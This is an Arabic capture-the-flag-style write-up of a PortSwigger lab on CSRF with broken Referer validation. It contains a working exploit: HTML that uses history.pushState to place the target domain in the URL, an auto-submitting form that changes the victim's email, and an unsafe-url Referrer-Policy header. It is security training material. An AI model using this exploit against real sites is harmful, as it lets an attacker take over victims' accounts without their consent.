# [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)

## **`الهدف`**
إنشاء كود `HTML` يقوم بعمل هجوم `CSRF` بحيث يغير الـ `email` الخاص بالضحية.
## **`خطوات الحل`**
**`نفس خطوات حل لاب` [CSRF vulnerability with no defenses](./CSRF-vulnerability-with-no-defenses.md)

ولكن بما أن هذا اللاب يعتمد على ترويسة `Referer` وإذا قمنا بتغييرها يقوم برفض الطلب ولكن إذا قمنا بتغييرها بشرط أن يتضمنها الدومين الأصلى فإن الطلب يمر بدون مشاكل لذلك فسنقوم بإضافة جزء فى السكريبت لكي يقوم بتضمين الدومين الأصلى داخل الـ `URL``.

`history.pushState("", "", "/?0ad100fa03011b8b80e84efb00dd00d5.web-security-academy.net")`

حيث أن دالة `history.pushState()` هي إحدى ميزات `JavaScript` المعيارية في المتصفح، وتُستخدم لتغيير المسار `URL` المعروض في شريط العنوان وتحديث سجل التصفح `History`دون إعادة تحميل الصفحة، والصيغة القياسية لهذه الدالة هي:
```JS
history.pushState(state, title, url);
```

- **المعامل الأول (`state`):** كائن (`Object`) يُستخدم لتخزين بيانات متعلقة بحالة الصفحة، وإذا لم نكن بحاجة لتخزين بيانات، نمرر نصاً فارغاً `""` أو كائناً فارغاً `{}`.
- **المعامل الثاني (`title`):** عنوان الصفحة الجديد، ومعظم المتصفحات حالياً تتجاهل هذا المعامل، لذلك يتم تمرير نص فارغ `""`.
- **المعامل الثالث (`url`):** وهو الجزء المهم هنا، وهذا هو المسار الجديد الذي سيتغير إليه `URL` الصفحة الحالية في المتصفح.

لذلك سنقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع السكريبت التالي في خانة `Body`.
```html
<script> history.pushState("", "", "/?0ad100fa03011b8b80e84efb00dd00d5.web-security-academy.net")</script>
<form method="POST" action="https://0ad100fa03011b8b80e84efb00dd00d5.web-security-academy.net/my-account/change-email"> 
    <input type="hidden" name="email" value="test@test.com"> 
</form> 
<script> 
        document.forms[0].submit(); 
</script>
```

وبعد ذلك سنضع في خانة `Head` العبارة التالية:
```http
Referrer-Policy: unsafe-url
```

ثم نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [CSRF vulnerability with no defenses](./CSRF-vulnerability-with-no-defenses.md)
